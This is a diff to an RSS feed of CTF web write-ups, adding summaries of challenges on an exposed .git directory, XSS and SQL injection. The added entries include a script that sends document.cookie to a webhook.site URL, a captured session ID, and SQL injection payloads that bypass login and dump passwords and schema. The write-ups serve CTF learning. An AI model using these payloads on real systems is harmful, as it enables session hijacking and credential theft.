@@ -9,21 +9,37 @@
     <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
     <lastBuildDate>Fri, 15 Sep 2023 21:14:35 +0200</lastBuildDate><atom:link href="https://morebaconstrips.github.io/writeups/web/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>git_gud</title>
+      <link>https://morebaconstrips.github.io/writeups/web/git_gud/</link>
+      <pubDate>Sat, 16 Sep 2023 18:48:00 +0200</pubDate>
+      
+      <guid>https://morebaconstrips.github.io/writeups/web/git_gud/</guid>
+      <description>I found this nice website that is supposed to help me get better at flag capturing, however, it just tells me to GIT GUD!
+gobuster -u http://ths.eemcs.utwente.nl:33035/ -w ./SecLists/Discovery/Web-Content/common.txt We discover that the .git dir is exposed
+wget -m http://ths.eemcs.utwente.nl:33035/.git/ git ls-files --stage Scraping in the folders we notice the sha1 of a git object in a file called master, so we read the content
+input: git cat-file -p 8ada2d530c7223ac387dd0ca7de781676a451cc3 output: tree c406e4f12544b6c7e193e6d3cecbc01f91256263 parent 3e7eebf4e038cf713fb74a8101d0c4a03325bd78 author Thijs van Ede thijs@ths.</description>
+    </item>
+    
+    <item>
       <title>XSS_1</title>
       <link>https://morebaconstrips.github.io/writeups/web/xss_1/</link>
       <pubDate>Sat, 16 Sep 2023 03:27:05 +0200</pubDate>
       
       <guid>https://morebaconstrips.github.io/writeups/web/xss_1/</guid>
-      <description></description>
+      <description>The X-treme Sports Society has a forum discussing X-treme sports. They even have a topic on X-treme CTFs where they share flags. This is only available for admin&amp;rsquo;s though, I wonder if we can view it anyway…
+&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt; Let&amp;rsquo;s open a session with webhook in order to steal some cookies
+Webhook.site - Test, process and transform emails and HTTP requests
+&amp;lt;script&amp;gt;fetch(&amp;#39;[https://webhook.site/3351a0cc-7a55-4f44-a01c-469fe72dbd0a](https://webhook.site/3351a0cc-7a55-4f44-a01c-469fe72dbd0a)&amp;#39;, {method: &amp;#39;POST&amp;#39;, body:document.cookie});&amp;lt;/script&amp;gt; forumSessionID=ZWezDhAFdy5+af2Tsw/EkqNiPJjMBFx+mFG2Jhuj2Bk= 💡 Use burp to forward the packet with the sniffed session ID or just change the forumSessionID in inspect page → storage → cookies → forumSessionIDm</description>
     </item>
     
     <item>
       <title>SQL_injection 1</title>
-      <link>https://morebaconstrips.github.io/writeups/web/sql_injection-1/</link>
+      <link>https://morebaconstrips.github.io/writeups/web/sql_injection_1/</link>
       <pubDate>Fri, 15 Sep 2023 20:48:53 +0200</pubDate>
       
-      <guid>https://morebaconstrips.github.io/writeups/web/sql_injection-1/</guid>
-      <description>aaa</description>
+      <guid>https://morebaconstrips.github.io/writeups/web/sql_injection_1/</guid>
+      <description>Our database contains the grades of some THS admins. Please use login in the docker container to view your grade. Admins can of course also view the flags in the database, luckily we have very secure access credentials.
+email: user@gmail.com password: password&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; UNION SELECT password,email FROM &amp;#39;users&amp;#39;;-- email: user@gmail.com password: password&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; UNION SELECT name,null FROM sqlite_schema;-- email: user@gmail.com password: password&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; UNION SELECT name,NULL FROM PRAGMA_TABLE_INFO(&amp;#34;table_that_definitely_does_not_contain_the_flag&amp;#34;);-- email: user@gmail.</description>
     </item>
     
   </channel>
